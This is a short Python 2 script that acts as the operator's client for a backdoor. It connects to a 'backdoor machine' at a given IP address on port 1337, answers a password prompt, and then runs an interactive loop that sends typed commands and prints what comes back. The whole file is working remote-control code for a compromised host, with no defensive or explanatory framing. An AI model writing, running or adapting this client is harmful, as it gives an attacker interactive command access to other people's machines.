import socket
from encrypt import send, receive, is_ask_pass, ask_pass
import sys

if len(sys.argv) < 2:
    print "Please enter the backdoor machine's IP address as your first argument"
    sys.exit()

HOST = sys.argv[1]
PORT = 1337

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

while True:
    data = receive(sock)
    if data == "TERMINATE":
        break
    if is_ask_pass(data):
        ask_pass(sock)
        continue
    sys.stdout.write(data)
    cmd = raw_input()
    if cmd == "quit" or cmd == "logout":
        break
    send(sock, cmd)

print "Logging out..."
sock.close()
